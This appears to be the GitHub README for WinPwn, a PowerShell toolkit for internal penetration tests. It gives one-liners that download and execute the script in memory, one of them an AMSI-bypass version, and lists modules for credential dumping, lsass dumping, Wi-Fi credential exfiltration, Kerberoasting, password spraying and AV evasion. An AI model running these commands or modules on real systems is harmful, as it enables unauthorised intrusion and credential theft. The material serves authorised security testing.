[![](https://img.shields.io/badge/Donate-Bitcoin-blue.svg?style=flat)](https://blockchain.info/address/1MXReD1F4w5SUXK3phLVJ5M8KrXJHfecmZ)

# WinPwn
In many past internal penetration tests I often had problems with the existing Powershell Recon / Exploitation scripts due to missing proxy support. I often ran the same scripts one after the other to get information about the current system and/or the domain. To automate as many internal penetrationtest processes (reconnaissance as well as exploitation) and for the proxy reason I wrote my own script with automatic proxy recognition and integration. 
The script is mostly based on well-known large other offensive security Powershell projects. They are loaded into RAM via IEX Downloadstring.

Any suggestions, feedback, Pull requests and comments are welcome! 

Just Import the Modules with:
`Import-Module .\WinPwn.ps1` or 
`iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/WinPwn/master/WinPwn.ps1')`

For AMSI Bypass use the following oneliner:
`iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/WinPwn/master/ObfusWinPwn.ps1')`


If you find yourself stuck on a windows system with no internet access - no problem at all, just use Offline_Winpwn.ps1, all scripts and executables are included.

Functions available after Import:
* #### `WinPwn` -> Menu to choose attacks:
![alt text](https://raw.githubusercontent.com/SecureThisShit/WinPwn/master/WinPwn.jpg)
* #### `Inveigh` -> Executes Inveigh in a new Console window , SMB-Relay attacks with Session management (Invoke-TheHash) integrated
* #### `sessionGopher` -> Executes Sessiongopher Asking you for parameters
* #### `kittielocal` ->
  * Obfuscated Invoke-Mimikatz version
  * Safetykatz in memory
  * Dump lsass using rundll32 technique
  * Download and run Lazagne
  * Dump Browser credentials
  * Extract juicy informations from memory
  * Exfiltrate Wifi-Credentials
  * Dump SAM-File NTLM Hashes
* #### `localreconmodules` -> 
  * Collect installed software, vulnerable software, Shares, network information, groups, privileges and many more
  * Check typical vulns like SMB-Signing, LLMNR Poisoning, MITM6 , WSUS over HTTP
  * Checks the Powershell event logs for credentials or other sensitive informations
  * Search for passwords in the registry and on the file system
  * Find sensitive files (config files, RDP files, keepass Databases)
  * Search for .NET Binaries on the local system 
  * Optional: Get-Computerdetails (Powersploit) and PSRecon
* #### `domainreconmodules` -> 
  * Collect various domain informations for manual review 
  * Find AD-Passwords in description fields
  * Search for potential sensitive domain share files
  * ACLAnalysis
  * Unconstrained delegation systems/users are enumerated
  * MS17-10 Scanner for domain systems
  * SQL Server discovery and Auditing functions (default credentials, passwords in the database and more)
  * MS-RPRN Check for Domaincontrollers
  * Group Policy Audit with Grouper2
  * An AD-Report is generated in CSV Files (or XLS if excel is installed) with ADRecon. 
* #### `Privescmodules` -> Executes different privesc scripts in memory (PowerUp Allchecks, Sherlock, GPPPasswords)
* #### `latmov` -> Searches for Systems with Admin-Access in the domain for lateral movement. Mass-Mimikatz can be used after for the found systems
* #### `shareenumeration` -> Invoke-Filefinder and Invoke-Sharefinder (Powerview / Powersploit)
* #### `groupsearch` -> Get-DomainGPOUserLocalGroupMapping - find Systems where you have Admin-access or RDP access to via Group Policy Mapping (Powerview / Powersploit)
* #### `Kerberoasting` -> Executes Invoke-Kerberoast in a new window and stores the hashes for later cracking
* #### `powerSQL` -> SQL Server discovery, Check access with current user, Audit for default credentials + UNCPath Injection Attacks
* #### `Sharphound` -> Downloads Sharphound and collects Information for the Bloodhound DB
* #### `adidnswildcard` -> Create a Active Directory-Integrated DNS Wildcard Record
* #### `MS17-10` -> Scan active windows Servers in the domain or all systems for MS17-10 (Eternalblue) vulnerability
* #### `Sharpcradle` -> Load C# Files from a remote Webserver to RAM
* #### `DomainPassSpray` -> DomainPasswordSpray Attacks, one password for all domain users

The submodule is a forked and edited version of https://github.com/Cn33liz/p0wnedShell. You can compile it yourself and use it for powershell restriction bypass and AMSI-Bypass. Most AV-Solutions can be evaded this way. Just run the executable File, choose 17. and execute WinPwn.

![alt text](https://raw.githubusercontent.com/SecureThisShit/WinPwn/master/p0wnedmenu.PNG)

![alt text](https://raw.githubusercontent.com/SecureThisShit/WinPwn/master/p0wned.png)

## TO-DO
- [x] Some obfuskation
- [ ] More obfuscation
- [ ] Proxy via PAC-File support
- [x] Get the scripts from my own creds repository (https://github.com/SecureThisShit/Creds) to be independent from changes in the original repositories
- [ ] More Recon/Exploitation functions
- [x] Add MS17-10 Scanner
- [x] Add menu for better handling of functions
- [x] Amsi Bypass
- [ ] Mailsniper integration
- [ ] Azure Checks / Modules integration
- [ ] LAPS Toolkit integration

## CREDITS

- [X] [Kevin-Robertson](https://github.com/Kevin-Robertson/) - Inveigh, Powermad, Invoke-TheHash
- [X] [Arvanaghi](https://github.com/Arvanaghi/) - SessionGopher
- [X] [PowerShellMafia](https://github.com/PowerShellMafia/) - Powersploit
- [X] [Dionach](https://github.com/Dionach/) - PassHunt
- [X] [A-mIn3](https://github.com/A-mIn3/) - WINSpect
- [X] [411Hall](https://github.com/411Hall/) - JAWS
- [X] [sense-of-security](https://github.com/sense-of-security/) - ADrecon
- [X] [dafthack](https://github.com/dafthack/) - DomainPasswordSpray
- [X] [rasta-mouse](https://github.com/rasta-mouse/) - Sherlock
- [X] [AlessandroZ](https://github.com/AlessandroZ/) - LaZagne
- [X] [samratashok](https://github.com/samratashok/) - nishang
- [X] [leechristensen](https://github.com/leechristensen/) - Random Repo
- [X] [HarmJ0y](https://github.com/HarmJ0y) - Many good Blogposts, Gists and Scripts
- [X] [NETSPI](https://github.com/NetSPI/) - PowerUpSQL
- [X] [Cn33liz](https://github.com/Cn33liz/) - p0wnedShell
- [X] [rasta-mouse](https://github.com/rasta-mouse/) - AmsiScanBufferBypass
- [X] [l0ss](https://github.com/l0ss/) - Grouper2
- [X] [dafthack](https://github.com/dafthack/) - DomainPasswordSpray

## Legal disclaimer:
Usage of WinPwn for attacking targets without prior mutual consent is illegal. It's the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program. Only use for educational purposes.
